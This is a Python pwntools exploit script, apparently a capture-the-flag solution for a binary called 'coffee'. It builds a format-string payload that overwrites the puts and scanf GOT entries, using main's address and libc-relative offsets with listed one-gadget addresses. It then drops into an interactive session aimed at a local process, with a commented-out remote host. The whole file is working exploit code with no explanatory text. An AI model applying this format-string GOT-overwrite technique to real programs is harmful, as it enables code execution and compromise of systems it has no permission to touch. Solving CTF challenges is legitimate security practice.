from pwn import *

elf = ELF('./coffee')
libc = ELF('./libc.so.6')
ld = ELF("./ld-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("34.146.101.4", 30002)

#gdb.attach(target, 'b *0x4011ca')

curr = 0
i = 16
payload = "%" + str(0+elf.sym['main'] & 0xffff) + "c" + "%" + str(i) + "$hn"		# to be written to puts got
curr += 0+elf.sym['main'] & 0xffff

gadget = [0xe6c7e, 0xe6c81, 0xe6c84]
offset = gadget[0]
offset = libc.sym['puts']
payload += "%*29$c" + "%" + str(offset - libc.sym['__libc_start_main'] - 243 - curr - 1) + "cA" + "%" + str(i + 1) + "$n"

payload += "A"*(0x50 - len(payload))
payload += p64(elf.got['puts']) + p64(elf.got['__isoc99_scanf'])
print("Payload: " + str((payload)))

target.sendline(payload)
target.recvuntil("A"*1)

target.interactive()
